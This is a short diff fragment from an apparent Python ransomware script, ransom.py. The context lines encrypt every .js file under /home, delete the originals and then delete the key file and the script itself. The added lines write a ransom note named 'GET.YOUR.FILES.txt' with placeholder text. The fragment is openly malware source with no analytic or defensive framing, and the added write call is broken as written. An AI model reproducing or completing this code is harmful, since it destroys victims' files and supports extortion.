@@ -132,6 +132,10 @@ for filename in glob.iglob('/home/**/*.js', recursive=True):
     with open(filename + '.enc', 'wb') as encrypted_file:
         encrypted_file.write(encrypted)
         os.remove(filename)
+ransom_message = '''type your message here'''
+ransom_message_txt = open("GET.YOUR.FILES.txt", 'wb')
+ransom_message_txt.write()
+ransom_message_txt.close()
 os.remove('mykey.key')
 os.remove('ransom.py')
 
